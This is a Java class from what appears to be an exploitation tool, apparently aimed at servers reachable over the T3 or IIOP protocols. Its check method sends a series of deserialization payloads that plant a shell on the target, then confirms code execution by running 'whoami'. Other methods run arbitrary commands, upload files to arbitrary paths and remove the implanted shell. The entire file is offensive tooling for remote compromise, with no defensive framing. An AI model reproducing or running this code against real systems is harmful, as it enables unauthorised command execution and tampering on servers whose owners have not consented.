package superman.vuls;

import superman.core.JNDIShellClient;
import superman.core.Log;
import superman.core.PayloadSend;
import superman.payloads.EchoPayload;
import superman.shells.T3OrIIOPShell;

import java.util.List;

public abstract class EchoVulImpl implements EchoVul {
    protected String protocol;
    protected String host;
    protected int port;
    protected List<EchoPayload> echoPayloads;
    //protected EchoPayload echoPayload;
    protected abstract void init(String protocol, String host, int port);

    @Override
    public String check(String protocol, String host, int port) {
        init(protocol,host,port);
        for (EchoPayload payload : echoPayloads) {
            Log.info("检查payload:"+payload.getClass().getSimpleName());
            try {
                PayloadSend.send(this.protocol,this.host,this.port,payload.getObject(T3OrIIOPShell.class));
                Thread.sleep(3000);
                String result = JNDIShellClient.exec(this.protocol,this.host,this.port,"whoami");
                if (result != null) {
                    //echoPayload = payload;
                    return result.trim();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    @Override
    public String exec(String cmd) {
        return JNDIShellClient.exec(protocol,host,port,cmd);
    }

    @Override
    public void upload(String path, String text) {
        JNDIShellClient.upload(protocol,host,port,path, text);
    }

    @Override
    public void remove() {
        JNDIShellClient.remove(protocol,host,port);
    }

}
